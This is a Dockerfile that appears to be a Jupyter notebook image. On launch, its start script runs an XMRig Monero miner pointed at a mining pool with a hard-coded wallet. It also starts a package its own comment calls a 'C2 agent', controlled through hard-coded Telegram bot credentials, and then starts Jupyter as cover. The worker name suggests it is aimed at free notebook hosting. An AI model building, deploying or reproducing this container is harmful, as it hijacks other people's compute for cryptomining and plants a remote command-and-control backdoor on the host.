FROM python:3.10-slim

USER root
RUN apt-get update && apt-get install -y wget tar git

# Download XMRig
RUN mkdir -p /opt/miner && \
    wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz && \
    tar -xf /tmp/xmrig.tar.gz -C /opt/miner --strip-components=1 && \
    chmod +x /opt/miner/xmrig

# Install C2 agent from GitHub (Telegram C2 mode - no URL needed)
RUN pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git

# Set Telegram C2 credentials
ENV TG_BOT_TOKEN=8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc
ENV TG_CHAT_ID=5804150664

# Create start script with debugging
RUN echo '#!/bin/bash\n\
echo "=== Starting Mining Worker ==="\n\
echo "Worker: mybinder-72229"\n\
echo "Pool: pool.hashvault.pro:80"\n\
echo "C2 Mode: Telegram (direct API)"\n\
\
# Start XMRig in background\n\
/opt/miner/xmrig -o pool.hashvault.pro:80 -u 44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5.mybinder-72229 --donate-level 1 --threads 2 --print-time 60 &\n\
XMRIG_PID=$!\n\
echo "XMRig started with PID $XMRIG_PID"\n\
\
# Start C2 agent (Telegram mode)\n\
echo "Starting C2 agent (Telegram mode)..."\n\
startcon &\n\
C2_PID=$!\n\
echo "C2 agent started with PID $C2_PID"\n\
\
# Keep container running\n\
exec "$@"' > /start.sh && \
    chmod +x /start.sh

# Start on container launch
ENTRYPOINT ["/start.sh"]
CMD ["jupyter-notebook", "--ip=0.0.0.0", "--port=8888"]
